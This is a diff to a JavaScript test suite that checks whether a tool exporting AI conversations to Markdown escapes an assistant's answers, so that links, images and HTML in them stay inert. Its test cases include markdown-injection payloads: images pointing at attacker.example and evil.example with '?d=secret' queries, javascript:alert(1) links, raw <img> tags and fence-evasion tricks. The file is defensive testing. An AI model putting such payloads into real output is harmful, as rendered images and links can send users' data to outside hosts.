@@ -95,7 +95,7 @@ describe('the export of a conversation', () => {
                 '',
                 '### Assistant · Nov 26, 2026, 9:00 AM · 12 s',
                 '',
-                '> The **fs#1** resource failed.',
+                '> The \\*\\*fs#1\\*\\* resource failed.',
                 '>',
                 '> ```sh',
                 '> om prod/svc/web logs',
@@ -148,41 +148,50 @@ describe('the export of a conversation', () => {
         );
     });
 
-    test('quotes an answer, its code as written and a block left open closed', () => {
+    test('quotes an answer, its code blocks fenced again as written, one left open closed', () => {
         const text = markdown([
             prompt('t1', 'Show'),
-            answer('t1', '```ini\n[a]\n\n\n[b]\n<img src=x> ![i](https://x)\n```\nThen:\n~~~\nopen block\n### You · fake'),
+            answer('t1', '```ini\n[a]\n\n\n[b]\n<img src=x> ![i](https://x)\n```\nThen:\n~~~\nopen ```` block\n### You · fake'),
             prompt('t2', 'Next'),
         ]);
         expect(text).toContain(
-            ['> ```ini', '> [a]', '>', '>', '> [b]', '> <img src=x> ![i](https://x)', '> ```', '> Then:', '> ~~~', '> open block', '> ### You · fake', '> ~~~', ''].join(
-                '\n'
-            )
+            ['> ```ini', '> [a]', '>', '>', '> [b]', '> <img src=x> ![i](https://x)', '> ```', '> Then:', '> `````', '> open ```` block', '> ### You · fake', '> `````', ''].join('\n')
         );
         // The next turn is the document's, out of the quote.
         expect(text).toContain('\n---\n\n### You · Nov 26, 2026, 9:00 AM\n\n```\nNext\n```\n');
     });
 
-    test('loads nothing and leads nowhere unsafe from an answer, its code spans as written', () => {
-        const text = markdown([
-            prompt('t1', 'Check'),
-            answer(
-                't1',
-                [
-                    'See ![chart](https://attacker.example/?d=secret) and <img src=https://attacker.example> <!-- x -->.',
-                    '[Runbook](https://docs.example/run) [creds](https://u:p@attacker.example) [js](javascript:alert(1)) [rel](/etc)',
-                    'Code `<b>![x](y)</b>` stays, \\![escaped] too, a < b and 2<3.',
-                    '[ref]: javascript:alert(1)',
-                    '[ok]: https://docs.example',
-                ].join('\n')
-            ),
-        ]);
-        expect(text).toContain('> See \\![chart](https://attacker.example/?d=secret) and \\<img src=https://attacker.example> \\<!-- x -->.');
-        expect(text).toContain(
-            '> [Runbook](https://docs.example/run) [creds]\\(https://u:p@attacker.example) [js]\\(javascript:alert(1)) [rel]\\(/etc)'
-        );
-        expect(text).toContain('> Code `<b>![x](y)</b>` stays, \\![escaped] too, a < b and 2<3.');
-        expect(text).toContain('> \\[ref]: javascript:alert(1)\n> [ok]: https://docs.example\n');
+    // Out of its code blocks, an answer holds no markup but escaped: whatever the
+    // model wrote, nothing loads, links or passes for html where the file is read.
+    // An exclamation mark alone makes no image, its bracket escaped.
+    const unescapedMarkup = (text) => {
+        const prose = [];
+        let fence = null;
+        for (const line of text.split('\n').filter((item) => item.startsWith('>')).map((item) => item.replace(/^> ?/, ''))) {
+            const marker = /^(`{3,})/.exec(line)?.[1];
+            if (fence !== null) {
+                if (line === fence) fence = null;
+            } else if (marker !== undefined) {
+                fence = marker;
+            } else {
+                prose.push(line);
+            }
+        }
+        return prose.filter((line) => /[[\]<>`*_~|]/.test(line.replace(/\\[\s\S]/g, '')));
+    };
+
+    test.each([
+        'See ![chart](https://attacker.example/?d=secret) and <img src=https://attacker.example> <!-- x -->.',
+        '[Runbook](https://docs.example/run) [creds](https://u:p@attacker.example) [js](javascript:alert(1)) [rel](/etc)',
+        '[note]: see ![p](https://evil.example/z.png?d=secret) and <img src="https://evil.example/y.png"> and <javascript:alert(1)>',
+        '\\`![x](https://evil.example/leak?d=secret)`',
+        'a ` b\nc ` ![x](https://evil.example/m.png) ` d',
+        'text\n    ```\n![x](https://evil.example/a)\n\nmore <b>bold</b>',
+        '- item\n  ```\n  code\n![x](https://evil.example/b)',
+        '- [a]: javascript:alert(1)\n\n[a]:\njavascript:alert(1)\n\n[click][a]',
+    ])('loads nothing and leads nowhere from an answer: %s', (written) => {
+        const text = markdown([prompt('t1', 'Check'), answer('t1', written)]);
+        expect(unescapedMarkup(text)).toEqual([]);
     });
 
     test('keeps the names of the steps and of the cluster from making links, emphasis or hidden text', () => {
